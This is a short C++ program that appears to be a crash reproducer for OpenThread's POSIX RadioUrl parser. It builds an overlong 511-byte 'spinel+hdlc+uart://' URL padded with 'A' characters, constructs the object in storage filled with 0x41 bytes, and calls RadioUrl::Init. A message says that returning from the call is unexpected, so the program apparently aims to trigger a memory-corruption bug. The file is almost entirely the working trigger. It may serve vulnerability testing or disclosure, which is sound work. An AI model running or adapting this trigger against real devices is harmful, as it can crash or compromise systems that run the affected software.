#include <cstdarg>
#include <cstdio>
#include <cstring>
#include <new>
#include <string>

#include "posix/platform/radio_url.hpp"

extern "C" void otLogCritPlat(const char *aFormat, ...)
{
    va_list args;

    va_start(args, aFormat);
    vfprintf(stderr, aFormat, args);
    fputc('\n', stderr);
    va_end(args);
}

int main()
{
    constexpr size_t kTriggerLength = 511;
    std::string      crafted("spinel+hdlc+uart://");

    if (crafted.size() > kTriggerLength)
    {
        std::fprintf(stderr, "prefix too long\n");
        return 1;
    }

    crafted.resize(kTriggerLength, 'A');

    alignas(ot::Posix::RadioUrl) unsigned char storage[sizeof(ot::Posix::RadioUrl)];
    std::memset(storage, 0x41, sizeof(storage));

    auto *radio = new (storage) ot::Posix::RadioUrl("a://b");

    std::fprintf(stderr, "calling RadioUrl::Init with crafted length=%zu\n", crafted.size());
    radio->Init(crafted.c_str());

    std::fprintf(stderr, "unexpectedly returned from RadioUrl::Init\n");
    return 0;
}
